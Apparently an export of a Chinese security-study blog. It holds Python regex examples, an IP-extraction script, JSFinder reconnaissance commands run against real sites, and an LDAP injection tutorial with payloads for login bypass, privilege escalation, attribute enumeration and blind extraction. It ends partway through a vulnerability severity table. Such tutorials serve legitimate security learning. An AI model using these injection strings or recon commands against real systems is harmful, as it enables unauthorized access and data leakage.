<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">line = <span class="string">&quot;Cats are smarter than dogs&quot;</span></span><br><span class="line"> </span><br><span class="line">matchObj = re.<span class="keyword">match</span>( <span class="string">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group(1) : &quot;</span>, matchObj.group(<span class="number">1</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group(2) : &quot;</span>, matchObj.group(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">matchObj.group() :  Cats are smarter than dogs</span><br><span class="line">matchObj.group(1) :  Cats</span><br><span class="line">matchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>

<p>对应结果为：</p>
<table>
<thead>
<tr>
<th align="center">匹配对象方法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">group(num&#x3D;0)</td>
<td align="center">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
</tr>
<tr>
<td align="center">groups()</td>
<td align="center">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
</tr>
</tbody></table>
<p>因为match比较菜，就不多说了。</p>
<h4 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h4><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>

<p>函数参数说明：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pattern</td>
<td align="left">匹配的正则表达式</td>
</tr>
<tr>
<td align="left">string</td>
<td align="left">要匹配的字符串。</td>
</tr>
<tr>
<td align="left">flags</td>
<td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>
</tr>
</tbody></table>
<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p>
<p>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>
<table>
<thead>
<tr>
<th align="left">匹配对象方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">group(num&#x3D;0)</td>
<td align="left">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
</tr>
<tr>
<td align="left">groups()</td>
<td align="left">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
</tr>
</tbody></table>
<h4 id="re-match与re-search的区别"><a href="#re-match与re-search的区别" class="headerlink" title="re.match与re.search的区别"></a>re.match与re.search的区别</h4><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>
<h4 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.sub(pattern, repl, string, count=<span class="number">0</span>, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>pattern : 正则中的模式字符串。</li>
<li>repl : 替换的字符串，也可为一个函数。</li>
<li>string : 要被查找替换的原始字符串。</li>
<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">phone = <span class="string">&quot;2004-959-559 # 这是一个国外电话号码&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除字符串中的 Python注释 </span></span><br><span class="line">num = re.sub(<span class="string">r&#x27;#.*$&#x27;</span>, <span class="string">&quot;&quot;</span>, phone)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;电话号码是: &quot;</span>, num</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除非数字(-)的字符串 </span></span><br><span class="line">num = re.sub(<span class="string">r&#x27;\D&#x27;</span>, <span class="string">&quot;&quot;</span>, phone)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;电话号码是 : &quot;</span>, num</span><br><span class="line"><span class="comment">#电话号码是:  2004-959-559 </span></span><br><span class="line"><span class="comment">#电话号码是 :  2004959559</span></span><br></pre></td></tr></table></figure>

<p>repl 参数是一个函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将匹配的数字乘以 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double</span>(<span class="params">matched</span>):</span><br><span class="line">    value = <span class="built_in">int</span>(matched.group(<span class="string">&#x27;value&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(value * <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">&#x27;A23G4HFD567&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.sub(<span class="string">&#x27;(?P&lt;value&gt;\d+)&#x27;</span>, double, s))</span><br></pre></td></tr></table></figure>

<p>不管了，直接实战</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;1.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">columns = df.columns.values.tolist()  <span class="comment">### 获取excel 表头 ，第一行</span></span><br><span class="line"><span class="comment"># res=[]</span></span><br><span class="line">myfile = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">patter1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line">patter2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d-25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)-(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, row <span class="keyword">in</span> df.iterrows():  <span class="comment">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class="line">    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">        curstr = row[column]</span><br><span class="line">        <span class="keyword">if</span> pd.isna(curstr):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strlen = <span class="built_in">len</span>(curstr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res1 = re.findall(patter1, <span class="built_in">str</span>(curstr))</span><br><span class="line">        res2 = re.findall(patter2, <span class="built_in">str</span>(curstr))</span><br><span class="line">        <span class="keyword">if</span> res1:</span><br><span class="line">            <span class="built_in">print</span>(res1)</span><br><span class="line">        <span class="keyword">if</span> res2:</span><br><span class="line">            <span class="built_in">print</span>(res2)</span><br></pre></td></tr></table></figure>

<p>可以提取IP形如：192.168.1.1，192.168.1.1-192.168.1.100</p>
<h3 id="java安全学习"><a href="#java安全学习" class="headerlink" title="java安全学习"></a>java安全学习</h3><h3 id="jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）"><a href="#jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）" class="headerlink" title="jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）"></a>jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）</h3><p><a href="https://blog.csdn.net/qq_41901122/article/details/125151522">(40条消息) JS信息收集工具JSFinder_星球守护者的博客-CSDN博客</a></p>
<p><a href="https://xz.aliyun.com/t/5390">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>
<h4 id="Plus"><a href="#Plus" class="headerlink" title="Plus:"></a>Plus:</h4><p>查看帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3  JSFinderPlus.py -h</span><br></pre></td></tr></table></figure>

<p>简单爬取的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinderPlus.py -u http://202.204.48.66/</span><br></pre></td></tr></table></figure>

<p>深度爬取:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinderPlus.py -u http://202.204.48.66/ -d</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230324223636869.png" alt="image-20230324223636869"></p>
<h4 id="jsFinder"><a href="#jsFinder" class="headerlink" title="jsFinder:"></a>jsFinder:</h4><p><a href="https://xz.aliyun.com/t/5390">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.jd.com/</span><br></pre></td></tr></table></figure>

<p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.jd.com/ -d -ou jd_url.txt -os jd_domain.txt</span><br></pre></td></tr></table></figure>

<p>除了这两种方式以外，还可以批量指定URL和JS链接来获取里面的URL。</p>
<p>指定URL：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python JSFinder.py -f text.txt</span><br></pre></td></tr></table></figure>

<p>指定JS：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python JSFinder.py -f text.txt -j</span><br></pre></td></tr></table></figure>

<h3 id="Ldap注入"><a href="#Ldap注入" class="headerlink" title="Ldap注入"></a>Ldap注入</h3><p><a href="https://www.freebuf.com/articles/170322.html">PentesterLab 新手教程（三） ：LDAP攻击 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.freebuf.com/vuls/356049.html">Web漏洞那些事儿：LDAP注入 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://xz.aliyun.com/t/5689">从一次漏洞挖掘入门Ldap注入 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_45116657/article/details/103943595">LDAP注入入门学习指南_weixin_45116657的博客-CSDN博客</a></p>
<h4 id="Ldap是什么？"><a href="#Ldap是什么？" class="headerlink" title="Ldap是什么？"></a>Ldap是什么？</h4><p><strong>轻型目录访问协议</strong>（英文：Lightweight Directory Access Protocol，缩写：LDAP）。LDAP是一种通讯协议，LDAP支持TCP&#x2F;IP，默认的端口是 389，加密的端口是 636。简单点来说就是，LDAP就是一个数据库，它是用来存储数据的。</p>
<p>但是，LDAP和其他的数据库（如MySQL、SQLserver）是不一样的，MySQL这类数据库的数据是按记录一条条记录存在表中，而LDAP数据库的结构是<strong>树状</strong>的，似于“<strong>目录服务</strong>”的特殊数据库，数据是存储在叶子节点上的。</p>
<p>为什么要用LDAP目录树来存储数据？用MySQL不行吗，为什么非要搞出一个树形的数据库呢？这是因为用树形结构存储数据，查询效率更高（具体为什么，可以看一下关系型数据库索引的实现原理——B树&#x2F;B+树）。在某些特定的场景下，使用树形数据库更理想。比如：需要储存大量的数据，而且数据不是经常更改，需要很快速的查找。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDAP（轻量级目录访问协议，Lightweight Directory Access Protocol）和MySQL是两种截然不同的技术。LDAP是一个目录服务协议，用于在网络中存储和查询有关对象（如用户、组、设备）的信息。MySQL是一种关系型数据库管理系统，用于存储、查询和管理结构化数据。</span><br><span class="line"></span><br><span class="line">以下是LDAP和MySQL之间的主要差异：</span><br><span class="line"></span><br><span class="line">数据结构：</span><br><span class="line">LDAP：LDAP数据以树状结构（称为目录信息树，DIT）存储，每个节点（称为条目）包含一组属性及其值。LDAP主要用于存储和查询具有层次结构的数据。</span><br><span class="line">MySQL：MySQL中的数据以表格形式存储，每个表格包含多个行和列。关系型数据库主要用于存储和查询结构化数据。</span><br><span class="line"></span><br><span class="line">查询语言：</span><br><span class="line">LDAP：使用LDAP查询语言（如LDAP搜索过滤器）进行数据查询。</span><br><span class="line">MySQL：使用结构化查询语言（SQL）进行数据查询和管理。</span><br><span class="line"></span><br><span class="line">用途：</span><br><span class="line">LDAP：通常用于身份验证和授权、组织结构和设备管理等场景。例如，LDAP常用于企业网络环境中的单点登录（SSO）和访问控制。</span><br><span class="line">MySQL：适用于存储和查询大量结构化数据的场景，如网站后端数据库、应用程序数据存储等。</span><br><span class="line"></span><br><span class="line">性能和可扩展性：</span><br><span class="line">LDAP：LDAP是为读取操作优化的协议，因此读取性能很高。但是，对于写入操作，LDAP的性能相对较低。LDAP支持复制和分区，可以通过这些特性提高可扩展性。</span><br><span class="line">MySQL：关系型数据库通常在读取和写入性能方面都表现良好。通过分片、复制和分区等技术，MySQL可以实现高可扩展性。</span><br><span class="line">学习曲线：</span><br><span class="line"></span><br><span class="line">LDAP：学习LDAP可能需要更多时间，因为它涉及到目录服务概念、树状结构和查询语法。</span><br><span class="line">MySQL：相对来说，学习MySQL和SQL语言更容易上手。</span><br><span class="line">总之，LDAP和MySQL分别针对不同的应用场景和数据存储需求。LDAP适用于存储和查询具有层次结构的数据，而MySQL适用于存储和查询结构化数据。根据实际需求选择合适的技术是关键。</span><br></pre></td></tr></table></figure>

<h4 id="LDAP查询语法"><a href="#LDAP查询语法" class="headerlink" title="LDAP查询语法"></a>LDAP查询语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设你要树上的一个苹果（一条记录），你怎么告诉园丁它的位置呢？当然首先要说明是哪一棵树（dc，相当于MYSQL的DB），然后是从树根到那个苹果所经过的所有“分叉”（ou），最后就是这个苹果的名字（uid，相当于MySQL表主键id）。好了！这时我们可以清晰的指明这个苹果的位置了，就是那棵“歪脖树”的东边那个分叉上的靠西边那个分叉的再靠北边的分叉上的半红半绿的……，晕了！你直接爬上去吧！</span><br></pre></td></tr></table></figure>

<p>LDAP目录树形结构，存储在叶子节点上：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/1675070455_63d78bf79cd33b1fbaa25.png!small" alt="img" style="zoom:67%;" />

<p>从树根到达目标的位置，可能要经过好几个树杈，所有ou可能有多个值</p>
<p>1、&#x3D;（等于）查询</p>
<p>此 LDAP 参数表明某个属性等于某个值的条件得到满足。例如，如果希望查找“名“属性为“John”的所有对象，可以使用：(givenName&#x3D;John)。</p>
<p>这会返回“名”属性为“John”的所有对象。圆括号是必需的，以便强调 LDAP 语句的开始和结束。</p>
<p>2、&amp;（逻辑与）查询</p>
<p>如果具有多个条件并且希望全部条件都得到满足，则可使用此语法。例如，如果希望查找居住在 Dallas 并且“名”为“John”的所有人员，可以使用：(&amp;(givenName&#x3D;John)(l&#x3D;Dallas))</p>
<p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p>
<p>3、!（逻辑非）查询</p>
<p>此操作符用来排除具有特定属性的对象。假定您需要查找“名”为“John”的对象以外的所有对象。则应使用如下语句：(!givenName&#x3D;John)</p>
<p>此语句将查找“名”不为“John”的所有对象。请注意：! 操作符紧邻参数的前面，并且位于参数的圆括号内。由于本语句只有一个参数，因此使用圆括号将其括起以示说明。</p>
<p>4、（通配符）查询</p>
<p>可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用：(title&#x3D;*)</p>
<p>这会返回“title”属性包含内容的所有对象。另一个例子是：您知道某个对象的“名”属性的开头两个字母是“Jo”。那么，可以使用如下语法进行查找：(givenName&#x3D;Jo*)</p>
<p>这会返回“名”以“Jo”开头的所有对象。</p>
<h4 id="什么是Ldap注入"><a href="#什么是Ldap注入" class="headerlink" title="什么是Ldap注入"></a>什么是Ldap注入</h4><p>原理</p>
<p>LDAP具有特定的查询结构，并具有特定的语法，来对特定目录进行遍历。LDAP注入攻击和SQL注入攻击类似，利用用户引入的参数生成LDAP查询，由于部分参数没有适当的过滤，因此攻击者可以注入恶意代码以造成恶意攻击。</p>
<p>过滤器结构</p>
<p>LDAP同样基于客户端&#x2F;服务器模型，最常见的操作时使用过滤器搜索目录入口。客户端向服务器发送查询，服务器则响应匹配这些过滤器的目录入口。</p>
<p>LDAP过滤器定义于RFC4515中，这些过滤器的结构可概括如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fileter = (filtercomp)</span><br><span class="line">Filtercomp = and / or / not / item</span><br><span class="line">And = &amp; filterlist</span><br><span class="line">Or = | filterlist</span><br><span class="line">Not = ! filter</span><br><span class="line">Filterlist = 1*filter</span><br><span class="line">Item = simple / present / substring</span><br><span class="line">Simple = “=” / “~=” / ”&gt;=” / “&lt;=”</span><br><span class="line">Present = attr =*</span><br><span class="line">Substring = attr “=” [initial]*[final]</span><br><span class="line">Initial = assertion value</span><br><span class="line">Final = assertion value</span><br></pre></td></tr></table></figure>

<p>所有过滤器必须置于括号中，只有简化的逻辑操作符(AND、OR、NOT)和关系操作符(&#x3D;、&gt;&#x3D;、&lt;&#x3D;、~&#x3D;)可用于构造它们。特殊符“*”可用来替换过滤器中的一个或多个字符。</p>
<p>除使用逻辑操作符外，RFC4256还允许使用下面的单独符号作为两个特殊常量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;)     -&gt;Absolute TRUE </span><br><span class="line">(|)     -&gt;Absolute FALSE </span><br></pre></td></tr></table></figure>

<h4 id="Ldap注入详解"><a href="#Ldap注入详解" class="headerlink" title="Ldap注入详解"></a>Ldap注入详解</h4><p>目前使用得最广泛的LDAP：ADAM（不允许有两个过滤器）和OpenLDAP（第二个过滤器会被忽略）。</p>
<p>最简单的思路：</p>
<p>①(attribute&#x3D;value)</p>
<p>如果过滤器用于构造查询单缺少逻辑操作符，如value)(injected_filter的注入会导致两个过滤器(attribute&#x3D;value)(injected_filter)。在OpenLDAP实施中，第二个过滤器会被忽略（即(injected_filter)，起查询作用的是(attribute&#x3D;value)），只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的，因而这个注入毫无用处。</p>
<p>②(|(attribute&#x3D;value)(second_filter)) or (&amp;(attribute&#x3D;value)(second_filter)):如果第一个（注意，这里“第一个”不是指“(|(attribute&#x3D;value)(second_filter))”，而是指注入导致出现两个过滤器的第一个过滤器。如下面“(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)”的“(&amp;(attribute&#x3D;value)(injected_filter))”）用于构造查询的过滤器有逻辑操作符，形如value)(injected_filter)的注入会变成如下过滤器：(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)。虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符（即“(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)”的“(second_filter)”会被忽略）。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p>
<p>③一些应用框架在将请求发送给服务器之前会检查过滤器是否正确，在这种情况下，过滤器语义上必须是正确的，其注入如：value)(injected_filter))(&amp;(1&#x3D;0。这会导致出现两个不同的过滤器，第二个会被忽略：(&amp;(attribute&#x3D;value)(injected_filter))(&amp;(1&#x3D;0)(second_filter))。</p>
<p>既然第二个过滤器会被LDAP服务器忽略，有些部分便不允许有两个过滤器的查询。这种情况下，只能构建一个特殊的注入以获得单个过滤器的LDAP查询。value)(injected_filter这样的注入产生的结果是：(&amp;(attribute&#x3D;value)(injected_filter)(second_filter))。</p>
<p>测试一个应用是否存在代码注入漏洞典型的方法是向服务器发送会生成一个无效输入的请求，如果服务器返回一个错误消息，那么攻击者就能知道服务器执行了他的查询，他就可以利用代码注入技术来达到攻击的目的。</p>
<p>分为and注入or注入。也可分为盲注有回显两个种类。</p>
<p>详细看这个：<a href="https://www.freebuf.com/vuls/356049.html">Web漏洞那些事儿：LDAP注入 - FreeBuf网络安全行业门户</a></p>
<h4 id="Ldap注入实战"><a href="#Ldap注入实战" class="headerlink" title="Ldap注入实战"></a>Ldap注入实战</h4><p>案例1：绕过访问控制</p>
<p>初始：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER=Uname)(PASSWORD=Pwd)) </span><br></pre></td></tr></table></figure>

<p>我们的输入是Uname、和Pwd</p>
<p>可构造：Uname&#x3D;slisberger)(&amp;))</p>
<p>最后语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER= slisberger)(&amp;))(PASSWORD=Pwd))</span><br></pre></td></tr></table></figure>

<p>LDAP服务器只处理第一个过滤器，即仅查询(&amp;(USER&#x3D;slidberger)(&amp;))得到了处理。这个查询永真，因而攻击者无需有效地密码就能获取对系统的访问(下图)。</p>
<p>案例二：权限提升</p>
<p>现假设下面的查询会向用户列举出所有可见的低安全等级文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=document)(security_level=low)) </span><br></pre></td></tr></table></figure>

<p>这里第一个参数document是用户入口，low是第二个参数的值。如果攻击者想列举出所有可见的高安全等级的文档，他可以利用如下的注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document)(security_level=*))(&amp;(directory=documents</span><br></pre></td></tr></table></figure>

<p>生成的过滤器为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure>

<p>LDAP服务器仅会处理第一个过滤器而忽略第二个，因而只有下面的查询会被处理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))</span><br></pre></td></tr></table></figure>

<p>而</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure>

<p>则会被忽略。结果就是，所有安全等级的可用文档都会列举给攻击者，尽管他没有权限查看它们。</p>
<p>案例三：信息泄露</p>
<p>假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。这便是一个典型的OR注入案例，因为用于展示可用资源的查询为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(type=Rsc1)(type=Rsc2))</span><br></pre></td></tr></table></figure>

<p>Rsc1和Rsc2表示系统中不同种类的资源。例如：Rsc1&#x3D;printer，Rsc2&#x3D;scanner用于列出系统中所以可用的打印机和扫描器。</p>
<p>如果攻击者输入Rsc&#x3D;printer)(uid&#x3D;*)，则下面的查询被发送给服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(type=printer)(uid=*))(type=scanner)</span><br></pre></td></tr></table></figure>

<p>LDAP服务器会响应所有的打印机和用户对象。</p>
<p>案例四：信息盲注（可以使用字符集消减加快速度*anywhere*）</p>
<p>攻击者可以使用字母、数字搜索提取属性的值，这个想法的关键在于将一个复杂的值转化为TRUE&#x2F;FALSE列表。这个机制，通常称为booleanization，大意是二值化吧，可用于不同的方式。</p>
<p>假设攻击者想知道department属性的值，处理如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、(&amp;(idprinter=HPLaserJet2100)(department=a*))(object=printer))</span><br><span class="line">2、(&amp;(idprinter=HPLaserJet2100)(department=f*))(object=printer))</span><br><span class="line">3、(&amp;(idprinter=HPLaserJet2100)(department=fa*))(object=printer))</span><br></pre></td></tr></table></figure>

<p>本例中department的值是financial，用”a”的尝试没有获取任何打印机信息，因而第一个字母不是”a”。测试过其他字母后，唯一能正常返回的只有”f”，接下来测试第二个字母，当为”i”时才正常返回，以此类推即可获得department的值。</p>
<p>案例五：实战案例：</p>
<p><a href="https://xz.aliyun.com/t/5689">从一次漏洞挖掘入门Ldap注入 - 先知社区 (aliyun.com)</a></p>
<p>案例六：实战案例加代码分析（php）</p>
<p><a href="https://www.anquanke.com/post/id/86899">【漏洞分析】CVE-2017-14596：Joomla! LDAP注入导致登录认证绕过漏洞（含演示视频）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>案例七：pentestlab（php）</p>
<p><a href="https://www.freebuf.com/articles/170322.html">PentesterLab 新手教程（三） ：LDAP攻击 - FreeBuf网络安全行业门户</a></p>
<h4 id="LDAP注入危害"><a href="#LDAP注入危害" class="headerlink" title="LDAP注入危害"></a>LDAP注入危害</h4><p>攻击者可以恶意查询LDAP里面的所有数据，导致非常严重的信息泄露。</p>
<h4 id="LDAP防御"><a href="#LDAP防御" class="headerlink" title="LDAP防御"></a>LDAP防御</h4><p>对特殊字符进行过滤和转义。</p>
]]></content>
      <tags>
        <tag>todo</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞整理</title>
    <url>/2023/03/28/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>其实漏洞是通用的，不管是APP、微信小程序、公众号、网页了，这里细分一点主要是方便我进行一个记录。</p>
<span id="more"></span>

<h2 id="小程序公众号漏洞："><a href="#小程序公众号漏洞：" class="headerlink" title="小程序公众号漏洞："></a>小程序公众号漏洞：</h2><p><a href="https://juejin.cn/post/7202583557750603833">微信小程序解包+反编译 - 掘金 (juejin.cn)</a></p>
<p><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE">小程序配置 | 微信开放文档 (qq.com)</a></p>
<p><a href="https://blog.csdn.net/wapqke/article/details/118312263">微信小程序如何进行反编译详细教程_小程序反编译_陆大湿的博客-CSDN博客</a></p>
<p><a href="https://www.yeshen.com/faqs/S1ogLqZgW">夜神内微信搜索、扫二维码异常解决办法_夜神安卓模拟器新手帮助页 (yeshen.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1vU4y1r73j/?spm_id_from=888.80997.embed_other.whitelist">WX小程序反编译教程及解包教程和解包工具使用 大家看完记得三连哦 三连完了问我要工具哦_哔哩哔哩_bilibili</a></p>
<p>小程序反编译（有可能小程序里面源码有key类似的东西）</p>
<table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">等级</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">敏感信息泄露</td>
<td align="center"></td>
<td align="center">等级看泄露的什么来判</td>
</tr>
<tr>
<td align="center">目录浏览</td>
<td align="center">低</td>
<td align="center">访问控制问题</td>
</tr>
<tr>
<td align="center">验证码功能缺陷</td>
<td align="center">中</td>
<td align="center">防护机制问题</td>
</tr>
<tr>
<td align="center">Tomcat_AJP任意文件读取漏洞</td>
<td align="center">高</td>
<td align="center">访问控制问题，CVE-2020-1938</td>
</tr>
<tr>
<td align="center">同一时间能够对大量手机号发送短信验证码</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">短信验证码绕过</td>
<td align="center">低</td>
<td align="center">如果有号码加密，有的时候可以看到加密可以复用加密内容，然后越权</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">泄露中间件及版本（这都收</td>
</tr>
<tr>
<td align="center">暗链</td>
<td align="center">中</td>
<td align="center">网页中存在不是自己业务的域名，毫无相干</td>
</tr>
<tr>
<td align="center">内网地址泄露</td>
<td align="center">低</td>
<td align="center">js文件中可能存在内网地址</td>
</tr>
<tr>
<td align="center">短信验证码不失效</td>
<td align="center">低</td>
<td align="center">重新发了新的验证码，但是旧的验证码没失效，可以提高爆破概率</td>
</tr>
<tr>
<td align="center">未授权访问</td>
<td align="center">中</td>
<td align="center">直接访问对应url发现未授权访问</td>
</tr>
<tr>
<td align="center">shiro反序列化</td>
<td align="center">高</td>
<td align="center">可以RCE</td>
</tr>
<tr>
<td align="center">越权</td>
<td align="center">高</td>
<td align="center">修改ID可以看到别人信息</td>
</tr>
<tr>
<td align="center">文件上传</td>
<td align="center">高</td>
<td align="center">如果有可以jsp、php类似的都试一下</td>
</tr>
<tr>
